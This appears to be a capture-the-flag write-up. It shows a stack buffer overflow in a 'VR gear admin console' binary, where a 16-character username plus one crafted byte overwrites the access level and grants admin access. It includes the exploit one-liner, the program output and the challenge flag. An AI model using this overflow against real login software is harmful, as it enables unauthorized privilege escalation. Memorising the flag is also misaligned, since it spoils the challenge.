@@ -1,0 +1,67 @@
+naweiss@shell-web:/problems/5206d6e095708fbcc2dfa33cd2a8b819$ ./vrgearconsole
++----------------------------------------+
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|  Welcome to the VR gear admin console  |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++----------------------------------------+
+|                                        |
+|      Your account is not recognized    |
+|                                        |
++----------------------------------------+
+
+
+
+
+Please login to continue...
+
+
+Username (max 15 characters): aaaaaaaaaaaaaaaaa
+Password (max 31 characters): a
+Your access level is: 0x00000061
+Login successful.
+You do not have permission to access this resource.
+naweiss@shell-web:/problems/5206d6e095708fbcc2dfa33cd2a8b819$
+
+########################################
+You can see there is buffer overflow.
+So you must change the accessLevel to be less the 0x30:
+(python -c "print 'a'*16+'\x20'" ; cat) | ./vrgearconsole
+
+The password dose'nt matter
+########################################
+
+Example:
++----------------------------------------+
+|                                        |
+|                                        |
+|                                        |
+|                                        |
+|  Welcome to the VR gear admin console  |
+|                                        |
+|                                        |
+|                                        |
+|                                        |
++----------------------------------------+
+|                                        |
+|      Your account is not recognized    |
+|                                        |
++----------------------------------------+
+
+
+
+
+Please login to continue...
+
+
+Username (max 15 characters): Password (max 31 characters): a
+Your access level is: 0x00000020
+Admin access granted!
+The flag is in "flag.txt".
+cat flag.txt
+2ec38579232114dd2d235f797030af43
